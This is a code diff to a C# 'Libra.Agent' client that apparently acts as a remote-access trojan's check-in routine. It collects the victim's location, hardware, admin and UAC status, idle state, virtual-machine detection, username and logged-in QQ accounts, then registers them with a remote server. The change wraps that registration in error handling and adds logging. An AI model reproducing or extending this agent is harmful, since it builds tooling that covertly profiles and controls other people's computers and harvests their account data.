@@ -3,7 +3,6 @@ using Libra.Virgo;
 using Libra.Virgo.Enum;
 using Libra.Virgo.Models;
 using Libra.Virgo.Models.MessageType;
-using Newtonsoft.Json;
 using System.Text.Json;
 
 namespace Libra.Agent
@@ -26,54 +25,60 @@ namespace Libra.Agent
                     await MainHandle.Handle(dataJson, type);
                 };
 
-                var city = await Libra.Agent.Models.InfoHelper.GetCity();
-                var cpuInfo = Libra.Agent.Models.InfoHelper.GetCpuInfo();
-                var memoryInfo = Libra.Agent.Models.InfoHelper.GetPhysicalMemory();
-                var gpuInfo = Libra.Agent.Models.InfoHelper.GetGpuNames();
-                var diskInfo = Libra.Agent.Models.InfoHelper.Drives();
-                var bootTime = Libra.Agent.Models.InfoHelper.GetBootTime();
-                var lastActiveTime = Libra.Agent.Models.InfoHelper.MouseTracker.GetLastActiveTime();
-                var isIdle = Libra.Agent.Models.InfoHelper.MouseTracker.IsIdle();
-                var uacStatus = Libra.Agent.Models.InfoHelper.GetUacStatus();
-                var vmInfo = Libra.Agent.Models.InfoHelper.GetVirtualMachineInfo();
-
-                var agentInfo = new AgentInfo
+                try
                 {
-                    AgentId = Guid.Parse(AgentId),
-                    ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
-                    OsVersion = Libra.Agent.Models.InfoHelper.GetSystemVersion(),
-                    QQAccounts = Libra.Agent.Models.InfoHelper.GetQQList().ToList(),
-                    Network = new()
-                    {
-                        MacAddress = GetMacAddress(),
-                        Hostname = Environment.MachineName,
-                        Username = Environment.UserName
-                    },
-                    Privilege = new()
-                    {
-                        IsAdmin = IsRunningAsAdmin(),
-                        UacEnabled = uacStatus
-                    },
-                    LastHeartbeat = DateTime.UtcNow,
-                    StartTime = DateTime.Now,
-                    BootTime = bootTime,
-                    LastActiveTime = lastActiveTime,
-                    IsIdle = isIdle,
-                    Location = city.country + " " + city.city.Replace("’","'"),
-                    Hardware = new()
-                    {
-                        Cpu = cpuInfo,
-                        Memory = memoryInfo,
-                        Gpus = gpuInfo,
-                        Disks = diskInfo.Cast<object>().ToList(),
-                        IsVirtualMachine = vmInfo.IsVirtualMachine,
-                        VmType = vmInfo.VmType,
-                        Cameras = []
-                    }
-                };
+                    var city = await Libra.Agent.Models.InfoHelper.GetCity();
+                    var cpuInfo = Libra.Agent.Models.InfoHelper.GetCpuInfo();
+                    var memoryInfo = Libra.Agent.Models.InfoHelper.GetPhysicalMemory();
+                    var gpuInfo = Libra.Agent.Models.InfoHelper.GetGpuNames();
+                    var diskInfo = Libra.Agent.Models.InfoHelper.Drives();
+                    var bootTime = Libra.Agent.Models.InfoHelper.GetBootTime();
+                    var lastActiveTime = Libra.Agent.Models.InfoHelper.MouseTracker.GetLastActiveTime();
+                    var isIdle = Libra.Agent.Models.InfoHelper.MouseTracker.IsIdle();
+                    var uacStatus = Libra.Agent.Models.InfoHelper.GetUacStatus();
+                    var vmInfo = Libra.Agent.Models.InfoHelper.GetVirtualMachineInfo();
 
-                await VirgoClient.ConnectAsync(serverIp, serverPort, agentInfo, CancellationToken.None);
-                Console.WriteLine("连接成功并注册完成");
+                    var agentInfo = new AgentInfo
+                    {
+                        AgentId = Guid.Parse(AgentId),
+                        ProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName,
+                        OsVersion = Libra.Agent.Models.InfoHelper.GetSystemVersion(),
+                        QQAccounts = Libra.Agent.Models.InfoHelper.GetQQList().ToList(),
+                        Network = new()
+                        {
+                            MacAddress = GetMacAddress(),
+                            Hostname = Environment.MachineName,
+                            Username = Environment.UserName
+                        },
+                        Privilege = new()
+                        {
+                            IsAdmin = IsRunningAsAdmin(),
+                            UacEnabled = uacStatus
+                        },
+                        LastHeartbeat = DateTime.UtcNow,
+                        StartTime = DateTime.Now,
+                        BootTime = bootTime,
+                        LastActiveTime = lastActiveTime,
+                        IsIdle = isIdle,
+                        Location = city.country + " " + city.city.Replace("’", "'"),
+                        Hardware = new()
+                        {
+                            Cpu = cpuInfo,
+                            Memory = memoryInfo,
+                            Gpus = gpuInfo,
+                            Disks = diskInfo.Cast<object>().ToList(),
+                            IsVirtualMachine = vmInfo.IsVirtualMachine,
+                            VmType = vmInfo.VmType,
+                            Cameras = []
+                        }
+                    };
+
+                    await VirgoClient.ConnectAsync(serverIp, serverPort, agentInfo, CancellationToken.None);
+                    Console.WriteLine($"连接成功并注册完成\n{JsonSerializer.Serialize(agentInfo, AgentJsonContext.Default.AgentInfo)}");
+                }catch(Exception ex)
+                {
+                    Console.WriteLine($"注册时出错: {ex.Message} , {ex.StackTrace}");
+                }
             }
         }
 
@@ -91,7 +96,7 @@ namespace Libra.Agent
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"发送消息出错: {ex.Message}");
+                Console.WriteLine($"发送消息出错: {ex.Message} ，{ex.StackTrace}");
                 return false;
             }
         }
